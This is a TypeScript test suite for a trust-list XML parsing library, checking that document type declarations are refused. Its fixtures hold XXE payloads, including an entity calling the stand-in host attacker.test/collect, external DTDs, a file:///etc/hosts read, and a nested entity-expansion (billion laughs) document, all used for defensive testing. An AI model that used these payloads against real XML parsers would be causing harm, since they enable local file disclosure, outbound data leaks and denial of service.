/**
 * What a trust list may not make the XML parser do.
 *
 * Every document `lotl.ts` parses arrived over the network from somewhere this
 * code does not control, and one class of them — the national lists — may
 * arrive over plain http, so an on-path attacker chooses the bytes outright.
 * XML has three classical answers to that and all of them start in a document
 * type declaration: an internal entity that expands quadratically until the
 * process dies, an external entity that reads a local file into the document,
 * and an external DTD that turns a parse into an outbound request.
 *
 * Two separate claims are pinned here, and the distinction is the point.
 *
 * `@xmldom/xmldom` 0.9 does none of it — it expands no entity at all and
 * dereferences no identifier — so today none of these attacks reaches us. That
 * is a fact about a dependency, and the tests marked as such exist to notice
 * when it stops being true rather than to prove we are safe.
 *
 * What makes us safe is `parseXml` refusing the declaration, which is this
 * library's own and holds whatever the parser underneath would have done. An
 * entity cannot be declared without an internal subset or an external DTD, so
 * refusing both covers every entity a document can introduce; the predefined
 * five (`&amp;` and its siblings) need no declaration and expand to one
 * character each.
 */
import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { DOMParser } from '@xmldom/xmldom';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { X509Certificate } from 'node:crypto';
import {
  checkTrustListFreshness,
  parsePointers,
  parseServiceCertificates,
  parseTrustServices,
  verifyTrustList,
} from '../src/trust/lotl.ts';
import { trustListSigner } from './signed-trust-list.ts';

const TSL = 'http://uri.etsi.org/02231/v2#';
const GRANTED = 'http://uri.etsi.org/TrstSvc/TrustedList/Svcstatus/granted';
const CA_QC = 'http://uri.etsi.org/TrstSvc/Svctype/CA/QC';

const anchorPem = readFileSync(
  fileURLToPath(new URL('./fixtures/trust-anchor.pem', import.meta.url)),
  'utf8',
);
const ANCHOR = new X509Certificate(anchorPem);
const ANCHOR_B64 = anchorPem.replace(/-----[^-]+-----|\s/g, '');

/** A list that parses, so every refusal below is refusing something specific. */
function listXml(doctype = '', location = 'https://example.test/tl-de.xml') {
  return `<?xml version="1.0" encoding="UTF-8"?>${doctype}
<TrustServiceStatusList xmlns="${TSL}">
  <SchemeInformation>
    <ListIssueDateTime>2026-01-01T00:00:00Z</ListIssueDateTime>
    <NextUpdate><dateTime>2099-01-01T00:00:00Z</dateTime></NextUpdate>
    <PointersToOtherTSL><OtherTSLPointer>
      <TSLLocation>${location}</TSLLocation>
    </OtherTSLPointer></PointersToOtherTSL>
  </SchemeInformation>
  <TrustServiceProviderList><TrustServiceProvider><TSPServices>
    <TSPService><ServiceInformation>
      <ServiceTypeIdentifier>${CA_QC}</ServiceTypeIdentifier>
      <ServiceStatus>${GRANTED}</ServiceStatus>
      <StatusStartingTime>2020-01-01T00:00:00Z</StatusStartingTime>
      <ServiceDigitalIdentity><DigitalId><X509Certificate>${ANCHOR_B64}</X509Certificate></DigitalId></ServiceDigitalIdentity>
    </ServiceInformation></TSPService>
  </TSPServices></TrustServiceProvider></TrustServiceProviderList>
</TrustServiceStatusList>`;
}

/**
 * Every door into the parser, so the property is the library's rather than one
 * function's. `verifyTrustList` is included deliberately: it is the only one
 * that hands the document to `xml-crypto`, which parses it again with a parser
 * this project does not configure, so the declaration has to be refused before
 * the signature is checked rather than after.
 */
const entryPoints: [string, (xml: string) => unknown][] = [
  ['parsePointers', (xml) => parsePointers(xml)],
  ['parseTrustServices', (xml) => parseTrustServices(xml, [])],
  ['parseServiceCertificates', (xml) => parseServiceCertificates(xml, [])],
  ['checkTrustListFreshness', (xml) => checkTrustListFreshness(xml, { label: 'sample' })],
  ['verifyTrustList', (xml) => verifyTrustList(xml, { label: 'sample' })],
];

describe('document type declarations', () => {
  const declarations: [string, string][] = [
    ['an internal subset declaring an entity', `<!DOCTYPE TrustServiceStatusList [ <!ENTITY x "expanded"> ]>`],
    ['an external DTD', `<!DOCTYPE TrustServiceStatusList SYSTEM "http://attacker.test/evil.dtd">`],
    [
      'a public external DTD',
      `<!DOCTYPE TrustServiceStatusList PUBLIC "-//X//DTD//EN" "http://attacker.test/evil.dtd">`,
    ],
  ];

  for (const [what, doctype] of declarations) {
    for (const [name, run] of entryPoints) {
      it(`${name} refuses a list with ${what}`, () => {
        assert.throws(() => run(listXml(doctype)), /document type declaration/);
      });
    }
  }

  it('parses the same list once the declaration is gone', () => {
    // The positive control. Without it every test above would pass just as
    // well against a parser that refuses everything.
    assert.equal(parsePointers(listXml()).length, 1);
    assert.equal(parseServiceCertificates(listXml(), [])[0]?.fingerprint256, ANCHOR.fingerprint256);
    assert.ok(checkTrustListFreshness(listXml(), { label: 'sample', now: new Date('2026-06-01') }));
  });

  it('leaves a declaration that declares nothing alone', () => {
    // A bare `<!DOCTYPE` names the root element and carries no subset and no
    // identifier, so there is nowhere for an entity to be declared and nothing
    // to dereference. Refusing it would cost a list for a construct that
    // cannot carry the attack.
    assert.equal(parsePointers(listXml('<!DOCTYPE TrustServiceStatusList>')).length, 1);
  });

  it('reads the declaration from the document, not from the text', () => {
    // `<!DOCTYPE` inside a comment or a CDATA section is character data. A
    // regex over the fetched string cannot tell that from a real declaration,
    // which is why this check runs against the parsed tree — and why a list
    // that merely mentions the syntax is not refused.
    const commented = listXml(`<!-- <!DOCTYPE TrustServiceStatusList [ <!ENTITY x "y"> ]> -->`);
    assert.equal(parsePointers(commented).length, 1);

    const cdata = listXml('', `https://example.test/a<![CDATA[<!DOCTYPE x SYSTEM "y">]]>`);
    assert.equal(parsePointers(cdata)[0]?.url, 'https://example.test/a<!DOCTYPE x SYSTEM "y">');
  });

  it('refuses before the signature is checked', async () => {
    // A genuinely signed list, with a declaration added around it in transit.
    // The signature still verifies — the attacker did not touch what it covers
    // — so anything that checked the signature first would go on to parse a
    // document carrying the attacker's DTD.
    const signer = await trustListSigner();
    const signed = signer.sign(listXml());
    const wrapped = signed.replace(
      /^<\?xml[^>]*\?>/,
      `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE TrustServiceStatusList [ <!ENTITY x "expanded"> ]>`,
    );

    assert.notEqual(wrapped, signed);
    assert.throws(
      () => verifyTrustList(wrapped, { label: 'sample', expectedCerts: [new X509Certificate(signer.certificatePem)] }),
      /document type declaration/,
    );
  });
});

describe('entity expansion', () => {
  /**
   * Ten characters raised to the fourth power — 10 000 in one document, and
   * the same shape that reaches 10^9 with five more lines. What is asserted is
   * that the declaration never gets far enough for the size to be a question:
   * the parse is refused, not merely survived.
   */
  const laughs = `<!DOCTYPE TrustServiceStatusList [
      <!ENTITY l0 "aaaaaaaaaa">
      <!ENTITY l1 "&l0;&l0;&l0;&l0;&l0;&l0;&l0;&l0;&l0;&l0;">
      <!ENTITY l2 "&l1;&l1;&l1;&l1;&l1;&l1;&l1;&l1;&l1;&l1;">
      <!ENTITY l3 "&l2;&l2;&l2;&l2;&l2;&l2;&l2;&l2;&l2;&l2;">
    ]>`;

  it('refuses a list built to expand', () => {
    assert.throws(() => parseTrustServices(listXml(laughs, '&l3;'), []), /document type declaration/);
  });

  it('is not what the parser underneath would do (dependency)', () => {
    // Pins @xmldom/xmldom's behaviour rather than ours: it expands nothing, so
    // an entity reference survives as the eleven characters that were written.
    // If this ever fails, nothing is broken — the refusal above is what stands
    // between the change and this library — but the comment in `parseXml`
    // saying the attack is unreachable today has stopped being true.
    const doc = new DOMParser({ onError: () => {} }).parseFromString(
      `<?xml version="1.0"?><!DOCTYPE r [ <!ENTITY x "expanded"> ]><r>&x;</r>`,
      'text/xml',
    );

    assert.equal(doc.documentElement?.textContent, '&x;');
  });

  it('still expands the five entities XML defines itself', () => {
    // `&amp;` needs no declaration, expands to one character, and appears in
    // real lists — a URL with a query string is enough. The rule above must
    // not reach it.
    const url = 'https://example.test/tl.xml?a=1&amp;b=2';

    assert.equal(parsePointers(listXml('', url))[0]?.url, 'https://example.test/tl.xml?a=1&b=2');
  });
});

describe('what parsing a trust list may not do', () => {
  it('makes no outbound request', async () => {
    // An external entity turns a parse into a fetch in parsers that resolve
    // them, and this suite may touch no network at all. Both are asserted the
    // same way: nothing may call fetch while a document is being read.
    const original = globalThis.fetch;
    let called: string | undefined;
    globalThis.fetch = ((input: unknown) => {
      called = String(input);
      throw new Error(`parsing must not fetch (${called})`);
    }) as typeof fetch;

    try {
      assert.throws(
        () => parsePointers(listXml(`<!DOCTYPE TrustServiceStatusList [
            <!ENTITY xxe SYSTEM "http://attacker.test/collect">
          ]>`, '&xxe;')),
        /document type declaration/,
      );
      assert.equal(parsePointers(listXml()).length, 1);
    } finally {
      globalThis.fetch = original;
    }

    assert.equal(called, undefined);
  });

  it('reads no local file', () => {
    // The other half of XXE, and the one that exfiltrates rather than probes:
    // `file:///` in an entity puts the file's contents where a TSLLocation was
    // about to be read. Asserted against a path that exists on every machine
    // this runs on, so a parser that did resolve it would produce something
    // visibly different from the refusal.
    assert.throws(
      () =>
        parsePointers(
          listXml(`<!DOCTYPE TrustServiceStatusList [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>`, '&xxe;'),
        ),
      /document type declaration/,
    );
  });

  it('writes nothing to the console', () => {
    // The library logs nothing — and xmldom's default error handler writes
    // non-fatal parse errors to console.error, which an undeclared entity
    // reference is enough to trigger. That puts a string the attacker composed
    // into the operator's log from a code path that has no business logging at
    // all, so `parseXml` passes its own handler.
    const captured: unknown[][] = [];
    const original = { log: console.log, warn: console.warn, error: console.error };
    console.log = (...args: unknown[]) => captured.push(args);
    console.warn = (...args: unknown[]) => captured.push(args);
    console.error = (...args: unknown[]) => captured.push(args);

    try {
      // No declaration, so this is a document the parser accepts and reads —
      // and complains about while doing it.
      parsePointers(listXml('', '&undeclared;'));
    } finally {
      Object.assign(console, original);
    }

    assert.deepEqual(captured, []);
  });
});
